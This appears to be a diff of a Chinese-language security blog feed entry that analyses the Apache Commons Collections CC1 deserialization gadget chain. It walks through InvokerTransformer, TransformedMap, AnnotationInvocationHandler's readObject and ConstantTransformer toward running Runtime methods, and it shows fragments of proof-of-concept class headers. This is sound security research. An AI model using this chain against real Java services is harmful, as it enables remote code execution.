-&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;package Clown_CC1;
+&lt;p&gt;同样上面的是我手动去触发的get方法，下面用java对象代理来修改完整的poc链&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;java&#34;&gt;package Clown_CC1;
 
 import org.apache.commons.collections.ProxyMap;
 import org.apache.commons.collections.Transformer;
@@ -557,18 +544,17 @@ public class POC2 &amp;#123;
     &amp;#125;
 &amp;#125;
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304230124040.png&#34; alt=&#34;image-20230423012448964&#34; /&gt;&lt;/p&gt;
-&lt;h3 id=&#34;总结分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结分析&#34;&gt;#&lt;/a&gt; 总结分析&lt;/h3&gt;
-&lt;p&gt;这里拿 Transformer 的这个 poc 举例，首先是利用 InvokerTransformer，因为这个函数中的 Transformer 函数实现了 invoke&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304290158756.png&#34; alt=&#34;image-20230429015825587&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;可以执行方法，利用点找到后回推，寻找一个也调用 Transform 的类，来调用 InvokerTransformer 中的 Transformer 方法，在 TransformedMap 中有一个 checkTransformer&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304290200987.png&#34; alt=&#34;image-20230429020030950&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这里调用了 Transform 方法，且这里的 valueTransformer 可控&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304290202793.png&#34; alt=&#34;image-20230429020205753&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这里本意是对 Map 的键值通过 Transform 进行一个处理，可以利用，接着寻找哪个类调用了 checksetValue，寻找后发现在 AbstractInputCheckedMapDecorator 有调用&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304290207608.png&#34; alt=&#34;image-20230429020705557&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这里 MapEntry 其实就是键值对 MapEntry 中的 setValue 方法其实就是 Entry 中的 setValue 方法，他这里重写了 setValue 方法，所以说只需要遍历就能调用？？？不确定，可以试一下&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;package Clown_CC1;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304230124040.png&#34; alt=&#34;image-20230423012448964&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;总结分析&#34;&gt;&lt;a href=&#34;#总结分析&#34; class=&#34;headerlink&#34; title=&#34;总结分析&#34;&gt;&lt;/a&gt;总结分析&lt;/h3&gt;&lt;p&gt;这里拿Transformer的这个poc举例，首先是利用InvokerTransformer，因为这个函数中的Transformer函数实现了invoke&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304290158756.png&#34; alt=&#34;image-20230429015825587&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可以执行方法，利用点找到后回推，寻找一个也调用Transform的类，来调用InvokerTransformer中的Transformer方法，在TransformedMap中有一个checkTransformer&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304290200987.png&#34; alt=&#34;image-20230429020030950&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里调用了Transform方法，且这里的valueTransformer可控&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304290202793.png&#34; alt=&#34;image-20230429020205753&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里本意是对Map的键值通过Transform进行一个处理，可以利用，接着寻找哪个类调用了checksetValue，寻找后发现在AbstractInputCheckedMapDecorator有调用&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304290207608.png&#34; alt=&#34;image-20230429020705557&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里MapEntry其实就是键值对MapEntry中的setValue方法其实就是Entry中的setValue方法，他这里重写了setValue方法，所以说只需要遍历就能调用？？？不确定，可以试一下&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;java&#34;&gt;package Clown_CC1;
 
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
@@ -598,17 +584,18 @@ public class POC3test &amp;#123;
     &amp;#125;
 &amp;#125;
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304290214217.png&#34; alt=&#34;image-20230429021427161&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这里可以看到是成功弹出计算器，也就是成功调用了的，那么接下来找到一个遍历数组的地方就可以了这个・最好是 readObject 里面有，或者是通过 readObject 能间接的调用到的，这里是在 AnnotationInvocationHandler 中的 readObject 中直接找到了一个遍历 Map 的功能，这里还有一个 setvalue 方法，这就很符合我们的需求，这里因为它不是 public 类，这里需要通过反射区获取&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304290225727.png&#34; alt=&#34;image-20230429022551678&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;看一下构造方法，第一个参数是一个集成了 Annotation 的一个泛型，Annotation 是注解，第二个是 Map&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304290232515.png&#34; alt=&#34;image-20230429023253466&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;在循环中还有两个判断需要注意一下，它首先获取了传入注解的成员变量，然后用键值对的 key 在成员变量中查找，要不为空，所以我传入了 Retention 注解，其中有一个 value&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304290235476.png&#34; alt=&#34;image-20230429023520435&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;然后将 map 的键值改为 value，然后判断能不能强转，这个地方肯定是能够进入的，但是最后的 value 是我们不能直接控制的，我们需要将 value 给为 Runtime.class 这里是需要使用 ConstantTransformer 这个类去间接改变 value 的值&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304290239251.png&#34; alt=&#34;image-20230429023935195&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305161320125.png&#34; alt=&#34;image-20230516132045046&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304290214217.png&#34; alt=&#34;image-20230429021427161&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里可以看到是成功弹出计算器，也就是成功调用了的，那么接下来找到一个遍历数组的地方就可以了这个·最好是readObject里面有，或者是通过readObject能间接的调用到的，这里是在AnnotationInvocationHandler中的readObject中直接找到了一个遍历Map的功能，这里还有一个setvalue方法，这就很符合我们的需求，这里因为它不是public类，这里需要通过反射区获取&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304290225727.png&#34; alt=&#34;image-20230429022551678&#34;&gt;&lt;/p&gt;
+&lt;p&gt;看一下构造方法，第一个参数是一个集成了Annotation的一个泛型，Annotation是注解，第二个是Map&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304290232515.png&#34; alt=&#34;image-20230429023253466&#34;&gt;&lt;/p&gt;
+&lt;p&gt;在循环中还有两个判断需要注意一下，它首先获取了传入注解的成员变量，然后用键值对的key在成员变量中查找，要不为空，所以我传入了Retention注解，其中有一个value&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304290235476.png&#34; alt=&#34;image-20230429023520435&#34;&gt;&lt;/p&gt;
+&lt;p&gt;然后将map的键值改为value，然后判断能不能强转，这个地方肯定是能够进入的，但是最后的value是我们不能直接控制的，我们需要将value给为Runtime.class这里是需要使用ConstantTransformer这个类去间接改变value的值&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304290239251.png&#34; alt=&#34;image-20230429023935195&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305161320125.png&#34; alt=&#34;image-20230516132045046&#34;&gt;&lt;/p&gt;
 &lt;p&gt;这样讲传入的值设定后能够成功调用&lt;/p&gt;
+&lt;p&gt;最后整个流程&lt;br&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230709171356788.png&#34; alt=&#34;image-20230709171356788&#34;&gt;&lt;/p&gt;
 </content>
         <category term="java安全" scheme="https://blog.xcu.icu/categories/java%E5%AE%89%E5%85%A8/" />
         <category term="CC1" scheme="https://blog.xcu.icu/tags/CC1/" />
